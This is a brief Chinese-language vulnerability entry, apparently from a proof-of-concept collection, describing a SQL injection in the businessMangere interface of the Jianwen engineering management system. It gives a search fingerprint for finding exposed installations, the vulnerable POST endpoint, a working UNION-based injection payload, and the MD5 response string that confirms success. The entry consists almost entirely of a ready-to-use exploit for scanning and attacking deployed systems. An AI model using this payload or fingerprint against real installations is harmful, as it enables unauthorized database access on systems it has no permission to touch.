# 建文工程管理系统businessMangereSQL注入漏洞

建文工程管理系统businessMangere ｜ SQL注入 ｜ —
- **指纹**：`body="Login/QRLogin.ashx"`
- **请求**：`POST /AppInterface/Business/BusinessManger.ashx HTTP/1.1`

**Payload**
```
method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','233')),3,32));-- a
```
- **响应特征**：200 e165421110ba03099a1c0393373c5b43